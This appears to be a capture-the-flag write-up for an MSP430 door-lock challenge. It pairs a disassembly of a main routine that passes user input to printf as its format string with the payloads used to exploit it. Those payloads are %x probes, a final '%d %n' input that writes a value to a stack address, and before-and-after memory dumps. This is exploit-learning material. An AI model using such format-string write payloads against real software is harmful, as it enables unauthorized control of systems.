4438 <main>
4438:  3150 eaff      add	#0xffea, sp
443c:  8143 0000      clr	0x0(sp)
4440:  3012 e644      push	#0x44e6 "Login with username:password below to authenticate."
4444:  b012 c845      call	#0x45c8 <printf>
4448:  b140 1b45 0000 mov	#0x451b ">> ", 0x0(sp)
444e:  b012 c845      call	#0x45c8 <printf>
4452:  2153           incd	sp
4454:  3e40 1300      mov	#0x13, r14
4458:  3f40 0024      mov	#0x2400, r15
445c:  b012 8c45      call	#0x458c <getsn> // Read password to 0x2400 (Len 0x13 - 19)
4460:  0b41           mov	sp, r11
4462:  2b53           incd	r11
4464:  3e40 0024      mov	#0x2400, r14
4468:  0f4b           mov	r11, r15
446a:  b012 de46      call	#0x46de <strcpy> // Copy password to stack
446e:  3f40 0024      mov	#0x2400, r15
4472:  b012 b044      call	#0x44b0 <test_password_valid>
4476:  814f 0000      mov	r15, 0x0(sp)
447a:  0b12           push	r11
447c:  b012 c845      call	#0x45c8 <printf> // Printf password
4480:  2153           incd	sp
4482:  3f40 0a00      mov	#0xa '\n', r15 
4486:  b012 5045      call	#0x4550 <putchar>
448a:  8193 0000      tst	0x0(sp)
448e:  0324           jz	$+0x8 <main+0x5e>
4490:  b012 da44      call	#0x44da <unlock_door>
4494:  053c           jmp	$+0xc <main+0x68>
4496:  3012 1f45      push	#0x451f "That entry is not valid."
449a:  b012 c845      call	#0x45c8 <printf>
449e:  2153           incd	sp
44a0:  0f43           clr	r15
44a2:  3150 1600      add	#0x16, sp
44a6 <__stop_progExec__>

# First payload for understand pointer reference "1%x2%x3%x4%x5%x6%x7" 
1 2 2531 3 3278 4 7825 5 2533 6 3478 7

AA    BB  %d   CC   %d
4141 4242 2578 4343 2578
AABBCC4141

ANS:
tst  %d   %n
963e 256e 256e
-> Write 0200 to 3e96

SP When testings: 3e96

# Before printf of "TEST - %n"
3e70: 0000 0000 4c45 0100 5e45 0000 2000 2000   ....LE..^E.. . .
3e80: 4446 0000 4c45 0100 ce44 7d00 0024 903e   DF..LE...D}..$.>
3e90: 0024 0000 983e 0000 5445 5354 202d 2025   .$...>..TEST - %
3ea0: 6e00 0000 0000 0000 0000 0000 0000 0000   n...............
3eb0: 0000 0000 0000 0000 0000 0000 0000 0000 

# After
3e70: 0000 4c45 0100 5e45 0000 2000 2000 4446   ..LE..^E.. . .DF
3e80: 0000 0000 843e 0000 0000 0000 0000 0000   .....>..........
3e90: 983e 8044 983e 0000 5445 5354 202d 2025   .>.D.>..TEST - %
3ea0: 6e00 0000 0000 0000 0000 0000 0000 0000   n...............
3eb0: 0000 0000 0000 0000 0000 0000 0000 0000